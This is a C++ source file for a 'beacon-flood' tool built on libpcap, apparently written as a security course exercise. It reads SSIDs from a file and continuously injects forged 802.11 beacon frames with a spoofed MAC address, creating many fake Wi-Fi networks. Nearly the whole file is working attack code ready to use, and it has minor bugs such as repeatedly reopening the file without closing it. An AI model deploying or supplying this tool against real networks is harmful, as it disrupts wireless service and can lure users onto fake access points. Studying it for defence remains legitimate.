#include <pcap.h>

#include <stdio.h>

#include <string.h>

#include <stdlib.h>

#include <unistd.h>

struct radiotap_header{

    u_int8_t version = 0;         //always 0

    u_int8_t pad = 0;        //always 0

    u_int16_t len = 24;         //radiotap len

    u_int8_t present[4] = {0x2e, 0x40, 0x00, 0xa0};     //fields present

    u_int8_t flags[16] = {0x20, 0x08, 0x00, 0x00, 0x00, 0x02, 0x6c, 0x09, 
0xa0, 0x00, 0xa5, 0x00, 0x00, 0x00, 0xa5, 0x00 };                //flags - hardcoding, 값이 조금씩 다른 건 antenna signal

}__attribute__((packed));

struct beacon_frame{

    u_int8_t frame_control[2] = {0x80, 0x00};

    u_int16_t duration = 0;

    u_int8_t da[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};    //destination address

    u_int8_t sa[6] = {0x88, 0x36, 0x6c, 0x76, 0x64, 0xc6};    //source address

    u_int8_t bssid[6] = {0x88, 0x36, 0x6c, 0x76, 0x64, 0xc6};    //same source address

    u_int16_t seq_num = 0;                     //random

}__attribute__((packed));

struct essential_param{

    u_int64_t timestamp = 0;

    u_int16_t interval = 0;

    u_int16_t cap = 0;

}__attribute__((packed));

struct tag_ssid{

    u_int8_t num = 0;

    u_int8_t len = 16;

    u_int8_t ssid[16] = {0,};

}__attribute__((packed));

struct tag_rates{

    u_int8_t num = 1;

    u_int8_t len = 8;

    u_int8_t rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x12, 0x24, 0x48, 0x6c};

}__attribute__((packed));

struct tag_ds{

    u_int8_t num = 0;

    u_int8_t len = 1;

    u_int8_t ch = 11;

}__attribute__((packed));

struct fake_beacon{

    struct radiotap_header rh;

    struct beacon_frame bf;

    struct essential_param ep;

    struct tag_ssid tsid;

    struct tag_rates tr;

    struct tag_ds ds;

}__attribute__((packed));

void usage(){

    printf("syntax : beacon-flood <interface> <ssid-list-file>\n");

    printf("sample: beacon-flood mon0 ssid-list.txt\n");

}

typedef struct {

    char* dev_;

} Param;

Param param = {

    .dev_ = NULL

};

bool parse(Param* param, int argc, char* argv[]){

    if(argc!=3){

    usage();

    return false;

    }

    param->dev_ = argv[1];

    return true;

}

int main(int argc, char* argv[]) {

    if (!parse(&param, argc, argv))

    return -1;

    

    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t* pcap = pcap_open_live(param.dev_ , BUFSIZ, 1, 1000, errbuf);

    

    char *filename = argv[2];

    FILE *fp = fopen(filename, "r");

    if(fp == NULL){

    printf("Failed\n");

    return -1;

    }

    if (pcap == NULL) {

        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);

        return -1;

    }

 

    struct fake_beacon fb;

    char buf[16];

    while(true){

    while(fgets(buf, sizeof(buf), fp) != NULL){

        memcpy(fb.tsid.ssid, buf, 16);

        printf("Send -> %s", buf);

        if(pcap_sendpacket(pcap, (u_char *)&fb, sizeof(fb)) != 0){

        printf("Failed\n");

        return -1;

        }

    }

    fp = fopen(filename, "r");

    }

    /*while (true) {

    for(int i=0; i<10; i++){

        char str[16];

        sprintf(str, "testtest%d", i);

        memcpy(fb.tsid.ssid, str, 16);

            if (pcap_sendpacket(pcap, (u_char *)&fb, sizeof(fb)) != 0){

                printf("Failed\n");

                return -1;

            }

    }

    }*/

    fclose(fp);

    pcap_close(pcap);

}
